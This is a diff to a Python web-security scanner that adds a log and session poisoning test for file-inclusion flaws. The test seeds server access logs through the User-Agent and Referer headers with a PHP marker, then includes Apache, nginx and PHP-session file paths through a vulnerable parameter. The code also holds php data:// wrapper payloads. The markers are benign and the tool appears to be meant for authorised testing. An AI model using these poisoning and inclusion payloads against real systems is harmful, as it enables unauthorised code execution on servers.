@@ -16,6 +16,11 @@ parameter includes a remote file (or is an SSRF), and if the response shows the 
 value the remote file ran. The callback address is auto-detected from the route to the
 target, or given with --callback; --no-callback skips it.
 
+For a parameter that is shown to read a local file, the tool also tries log/session
+poisoning: it leaves a benign PHP marker in the access log (a poisoned User-Agent/Referer)
+and then includes common log and PHP-session paths through the parameter, flagging code
+execution when the marker runs. --no-log-poison skips it (it writes to the target's logs).
+
 Safety: only the host of `--base` is contacted directly; GET only; redirects are not
 followed; when the HAR holds a logged-in storage state its cookies are used so parameters
 behind login are reached; TLS is not verified; WSTG_PAUSE (--pause) applies. The callback
@@ -72,6 +77,34 @@ EXEC_PAYLOADS = [
     ("php data:// wrapper (code execution)", f"data://text/plain;base64,{_PHP}"),
     ("php data:// wrapper, url-encoded", "data://text/plain;base64," + _PHP.replace("=", "%3d")),
 ]
+
+# Log / session poisoning: a request whose logged value (User-Agent, Referer) is a benign
+# PHP marker leaves that marker in the server's access log; if a parameter then INCLUDES the
+# log file and the marker runs, EXEC_RESULT comes back. Tried only on a parameter that already
+# showed it reads a local file. The marker writes into the target's logs (a side effect).
+POISON = f"<?php echo {EXEC_SOURCE}; ?>"
+LOG_PATHS = [
+    "var/log/apache2/access.log", "var/log/apache2/error.log",
+    "var/log/apache2/other_vhosts_access.log",
+    "var/log/nginx/access.log", "var/log/nginx/error.log",
+    "var/log/httpd/access_log", "var/log/httpd/error_log",
+]
+SESSION_PATHS = ["var/lib/php/sessions/sess_{sid}", "tmp/sess_{sid}", "var/lib/php5/sess_{sid}"]
+
+
+def poison_payloads(cookie: str) -> list[tuple[str, str]]:
+    """(label, value) pairs that include a server log or PHP session file through the
+    parameter. Each path is tried from the web root (../ prefix) and as an absolute path."""
+    paths = list(LOG_PATHS)
+    m = re.search(r"(?:^|;\s*)PHPSESSID=([A-Za-z0-9,\-]+)", cookie or "")
+    if m:
+        paths += [p.format(sid=m.group(1)) for p in SESSION_PATHS]
+    out = []
+    for p in paths:
+        out.append((f"include {p}", _UP + p))
+        out.append((f"include /{p}", "/" + p))
+    return out
+
 
 # Remote file inclusion: the tool runs a short-lived HTTP server (the "callback") that
 # the target can fetch a benign PHP marker from. If the target fetches it, the parameter
@@ -291,10 +324,12 @@ def run(args) -> int:
         print(f"# {n}")
 
     sent = answered = 0
+    seeded = False
     try:
         for idx, c in enumerate(probe):
             print()
             print(f"== {c.path}?{c.param}=   [sources: {', '.join(sorted(c.sources))}]")
+            includable = False
             base_ans = ep.fetch(c.url(pr.base, c.pairs[c.index][1]), cookie)
             sent += 1
             answered += base_ans.status is not None
@@ -306,6 +341,7 @@ def run(args) -> int:
                 sent += 1
                 answered += a.status is not None
                 hit = signature(a.body) if a.status == 200 else None
+                includable = includable or bool(hit)
                 flag = ""
                 if hit:
                     flag = f"   <= TRAVERSAL: response contains {hit}"
@@ -325,6 +361,7 @@ def run(args) -> int:
                     flag = "   <= CODE EXECUTION: the included wrapper ran (evaluated an expression)"
                 elif a.status == 200 and EXEC_SOURCE in a.body:
                     flag = "   <= included but shown as source, not executed"
+                includable = includable or bool(flag)
                 print(f"   {label}: {a.short()}{flag}")
                 if flag:
                     print(f"       excerpt: {_excerpt(a.body)}")
@@ -338,6 +375,7 @@ def run(args) -> int:
                 client = cb.hit(str(idx), wait=2.0)
                 shown = a.status == 200 and EXEC_RESULT in a.body
                 src = a.status == 200 and EXEC_SOURCE in a.body
+                includable = includable or bool(client) or shown or src
                 if client and shown:
                     flag = f"   <= REMOTE CODE EXECUTION: the target fetched your file (from {client}) and ran it"
                 elif client and src:
@@ -351,6 +389,31 @@ def run(args) -> int:
                 print(f"   remote file inclusion ({url}): {a.short()}{flag}")
                 if client or shown or src:
                     print(f"       excerpt: {_excerpt(a.body)}")
+            if includable and not args.no_log_poison:
+                if not seeded:
+                    for _ in range(2):          # leave the PHP marker in the access log
+                        ep.fetch(pr.base + "/", cookie, extra_headers={"User-Agent": POISON, "Referer": POISON})
+                        if args.pause:
+                            time.sleep(args.pause)
+                    seeded = True
+                payloads = poison_payloads(cookie)
+                hits = []
+                for label, payload in payloads:
+                    if args.pause:
+                        time.sleep(args.pause)
+                    a = ep.fetch(c.url(pr.base, payload), cookie)
+                    sent += 1
+                    answered += a.status is not None
+                    if a.status == 200 and EXEC_RESULT in a.body:
+                        hits.append(f"   {label}: {a.short()}   <= LOG/SESSION POISONING: the included log ran your marker (code execution)")
+                        hits.append(f"       excerpt: {_excerpt(a.body)}")
+                    elif a.status == 200 and EXEC_SOURCE in a.body:
+                        hits.append(f"   {label}: {a.short()}   <= the log/session file was included (your marker is in it) but not executed")
+                        hits.append(f"       excerpt: {_excerpt(a.body)}")
+                print(f"   log/session poisoning: seeded the log with a PHP marker, tried {len(payloads)} log/session path(s)"
+                      + ("" if hits else "; none included"))
+                for ln in hits:
+                    print(ln)
     finally:
         if cb:
             cb.close()
@@ -378,6 +441,8 @@ def main(argv: list[str] | None = None) -> int:
     ap.add_argument("--callback", help="base URL the target should fetch the remote-inclusion file from "
                     "(http://IP[:PORT]); auto-detected from the route to the target when omitted")
     ap.add_argument("--no-callback", action="store_true", help="skip the remote file inclusion test")
+    ap.add_argument("--no-log-poison", action="store_true",
+                    help="skip log/session poisoning (it leaves a PHP marker in the target's logs)")
     return run(ap.parse_args(argv))
 
 
